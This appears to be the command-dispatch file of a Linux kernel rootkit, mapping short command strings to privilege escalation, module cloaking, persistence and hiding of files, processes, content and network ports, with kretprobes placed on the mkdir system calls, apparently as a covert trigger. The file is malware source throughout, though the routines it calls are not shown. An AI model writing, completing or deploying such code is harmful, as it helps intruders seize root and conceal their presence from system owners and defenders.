// SPDX-License-Identifier: GPL-2.0
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include "rootkit.h"

enum rk_cmd {
	CMD_ESCALATE,
	CMD_PID_ESCALATE,
	CMD_CLOAK,
	CMD_UNCLOAK,
	CMD_PERSIST,
	CMD_UNPERSIST,
	CMD_HIDE_FILE,
	CMD_UNHIDE_FILE,
	CMD_HIDE_PID,
	CMD_UNHIDE_PID,
	CMD_HIDE_CONTENT,
	CMD_UNHIDE_CONTENT,
	CMD_HIDE_PORT,
	CMD_UNHIDE_PORT,
	CMD_UNKNOWN,
};

struct rk_cmd_entry {
	const char *prefix;
	int len;
	enum rk_cmd kind;
	bool has_arg;
};

static const struct rk_cmd_entry cmd_table[] = {
	{ "e",         1, CMD_ESCALATE,       false },
	{ "cloak",     5, CMD_CLOAK,          false },
	{ "uncloak",   7, CMD_UNCLOAK,        false },
	{ "persist",   7, CMD_PERSIST,        false },
	{ "unpersist", 9, CMD_UNPERSIST,      false },
	{ "p.",        2, CMD_PID_ESCALATE,   true  },
	{ "h.f.",      4, CMD_HIDE_FILE,      true  },
	{ "u.f.",      4, CMD_UNHIDE_FILE,    true  },
	{ "h.i.",      4, CMD_HIDE_PID,       true  },
	{ "u.i.",      4, CMD_UNHIDE_PID,     true  },
	{ "h.c.",      4, CMD_HIDE_CONTENT,   true  },
	{ "u.c.",      4, CMD_UNHIDE_CONTENT, true  },
	{ "h.p.",      4, CMD_HIDE_PORT,      true  },
	{ "u.p.",      4, CMD_UNHIDE_PORT,    true  },
};

static enum rk_cmd rk_parse_cmd(const char *cmd, const char **arg)
{
	int i;

	for (i = 0; i < ARRAY_SIZE(cmd_table); i++) {
		const struct rk_cmd_entry *e = &cmd_table[i];

		if (e->has_arg) {
			if (strncmp(cmd, e->prefix, e->len) == 0) {
				*arg = cmd + e->len;
				return e->kind;
			}
		} else {
			if (strcmp(cmd, e->prefix) == 0) {
				*arg = NULL;
				return e->kind;
			}
		}
	}
	*arg = NULL;
	return CMD_UNKNOWN;
}

static int rk_unhide(struct rk_target_list *list, const char *arg)
{
	int idx;

	if (kstrtoint(arg, 10, &idx) != 0)
		return -EINVAL;
	return rk_target_remove(list, idx);
}

int rk_dispatch(const char *cmd)
{
	const char *arg;
	pid_t pid;

	switch (rk_parse_cmd(cmd, &arg)) {
	case CMD_ESCALATE:
		return rk_escalate();
	case CMD_PID_ESCALATE:
		if (kstrtoint(arg, 10, &pid) == 0) {
			rk_set_escalate_pid(pid);
			return 0;
		}
		return -EINVAL;
	case CMD_CLOAK:
		rk_cloak();
		return 0;
	case CMD_UNCLOAK:
		rk_uncloak();
		return 0;
	case CMD_PERSIST:
		return rk_persist();
	case CMD_UNPERSIST:
		return rk_unpersist();
	case CMD_HIDE_FILE:
		return rk_target_add(&rk_file_targets, arg);
	case CMD_UNHIDE_FILE:
		return rk_unhide(&rk_file_targets, arg);
	case CMD_HIDE_PID:
		return rk_target_add(&rk_pid_targets, arg);
	case CMD_UNHIDE_PID:
		return rk_unhide(&rk_pid_targets, arg);
	case CMD_HIDE_CONTENT:
		return rk_target_add(&rk_content_targets, arg);
	case CMD_UNHIDE_CONTENT:
		return rk_unhide(&rk_content_targets, arg);
	case CMD_HIDE_PORT:
		return rk_target_add(&rk_port_targets, arg);
	case CMD_UNHIDE_PORT:
		return rk_unhide(&rk_port_targets, arg);
	case CMD_UNKNOWN:
		return -ENOENT;
	}
	return -ENOENT;
}

/* Mkdir probe (handlers are no-ops; dispatch wired externally) */
static int mkdir_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	return 0;
}

static int mkdir_return(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	return 0;
}

struct kretprobe rk_mkdir_probe = {
	.handler        = mkdir_return,
	.entry_handler  = mkdir_entry,
	.maxactive      = 20,
	.kp.symbol_name = "__x64_sys_mkdir",
};

struct kretprobe rk_mkdirat_probe = {
	.handler        = mkdir_return,
	.entry_handler  = mkdir_entry,
	.maxactive      = 20,
	.kp.symbol_name = "__x64_sys_mkdirat",
};
